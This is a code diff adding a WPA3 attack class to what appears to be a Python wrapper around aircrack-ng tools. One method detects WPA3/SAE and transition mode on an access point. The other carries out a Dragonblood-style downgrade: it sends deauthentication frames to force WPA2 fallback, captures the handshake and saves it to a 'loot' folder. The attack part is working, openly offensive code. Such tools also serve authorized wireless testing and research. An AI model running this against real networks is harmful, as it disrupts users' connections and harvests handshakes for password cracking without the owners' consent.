@@ -252,3 +252,124 @@ class Hcxtools:
                 if match:
                     eapol_count = int(match.group(1))
         return {'command': cmd, 'success': pmkid_count > 0 or eapol_count > 0, 'pmkid_count': pmkid_count, 'eapol_count': eapol_count, 'output': result.stdout}
+
+class WPA3Tools:
+    """Wrapper for WPA3 / SAE tools and attacks."""
+
+    def __init__(self, layer: NativeLayer):
+        self.layer = layer
+
+    def check_sae_support(self, interface: str, bssid: str, timeout: int = 15) -> dict:
+        """
+        Check if an AP supports WPA3 (SAE) or OWE, and detect transition mode.
+        Runs a quick airodump-ng scan and parses the output.
+        """
+        import tempfile
+        import os
+
+        result_dict = {
+            "supports_sae": False,
+            "supports_owe": False,
+            "transition_mode": False
+        }
+
+        with tempfile.TemporaryDirectory() as tempdir:
+            out_prefix = os.path.join(tempdir, "wpa3check")
+            cmd = f'airodump-ng {shlex.quote(interface)} --bssid {shlex.quote(bssid)} -w {shlex.quote(out_prefix)} --output-format csv'
+            self.layer.run(f'timeout {timeout} {cmd}', sudo=True)
+
+            csv_file = f"{out_prefix}-01.csv"
+            if os.path.exists(csv_file):
+                try:
+                    with open(csv_file, 'r', encoding='utf-8', errors='ignore') as f:
+                        lines = f.readlines()
+
+                        # Find the BSSID line
+                        for line in lines:
+                            if line.startswith(bssid.upper()):
+                                parts = [p.strip() for p in line.split(',')]
+                                if len(parts) > 7:
+                                    auth = parts[7].upper()
+                                    cipher = parts[6].upper()
+
+                                    # Very basic check based on typical airodump-ng CSV output
+                                    if "SAE" in auth or "WPA3" in auth:
+                                        result_dict["supports_sae"] = True
+                                    if "OWE" in auth:
+                                        result_dict["supports_owe"] = True
+
+                                    # Transition mode typically shows WPA2/WPA3 mixed or PSK+SAE
+                                    if ("PSK" in auth and "SAE" in auth) or ("WPA2" in cipher and "WPA3" in cipher) or (result_dict["supports_sae"] and "PSK" in auth):
+                                        result_dict["transition_mode"] = True
+                                        result_dict["supports_sae"] = True
+                                break
+                except Exception:
+                    pass
+
+        return result_dict
+
+    def downgrade_attack(self, interface: str, bssid: str, channel: int = None, timeout: int = 30) -> dict:
+        """
+        Perform a WPA3 transition mode downgrade attack (Dragonblood style).
+        Sends deauth frames forcing WPA2 fallback, while listening for a WPA2 handshake.
+        """
+        import tempfile
+        import os
+        import time
+        import glob
+
+        result_dict = {
+            "success": False,
+            "log": [],
+            "capture_file": None
+        }
+
+        if not channel:
+            result_dict["log"].append("Error: Channel is required for downgrade attack.")
+            return result_dict
+
+        with tempfile.TemporaryDirectory() as tempdir:
+            out_prefix = os.path.join(tempdir, "downgrade")
+
+            # Start airodump-ng in the background to capture handshakes
+            dump_cmd = f'airodump-ng {shlex.quote(interface)} -c {channel} --bssid {shlex.quote(bssid)} -w {shlex.quote(out_prefix)} --output-format pcap'
+            dump_result = self.layer.run_background(dump_cmd, sudo=True)
+            result_dict["log"].append(f"Started capture on ch {channel}...")
+
+            # Let it spin up
+            time.sleep(2)
+
+            # Send continuous deauths
+            result_dict["log"].append("Sending forced deauths to trigger WPA2 fallback...")
+            deauth_cmd = f'aireplay-ng -0 5 -a {shlex.quote(bssid)} {shlex.quote(interface)}'
+            self.layer.run(deauth_cmd, sudo=True)
+
+            time.sleep(timeout - 2)
+
+            # Kill airodump-ng
+            self.layer.run(f"kill {dump_result.pid}", sudo=True)
+            time.sleep(1)
+
+            # Look for PCAP and check for handshakes (via aircrack-ng)
+            pcaps = glob.glob(f"{out_prefix}-*.cap") + glob.glob(f"{out_prefix}-*.pcap")
+            if pcaps:
+                pcap_file = pcaps[0]
+                check_cmd = f'aircrack-ng {shlex.quote(pcap_file)}'
+                check_result = self.layer.run(check_cmd)
+                if '1 handshake' in check_result.stdout or 'WPA (1 handshake)' in check_result.stdout:
+                    result_dict["success"] = True
+                    result_dict["log"].append("Successfully forced downgrade and captured WPA2 handshake!")
+
+                    # Copy to a persistent location
+                    import shutil
+                    persist_dir = os.path.expanduser("~/.james/loot")
+                    os.makedirs(persist_dir, exist_ok=True)
+                    dest_file = os.path.join(persist_dir, f"downgrade_{bssid.replace(':', '')}.pcap")
+                    shutil.copy2(pcap_file, dest_file)
+                    result_dict["capture_file"] = dest_file
+                else:
+                    result_dict["log"].append("Deauths sent, but no WPA2 handshake captured.")
+            else:
+                result_dict["log"].append("Error: No capture file generated.")
+
+        return result_dict
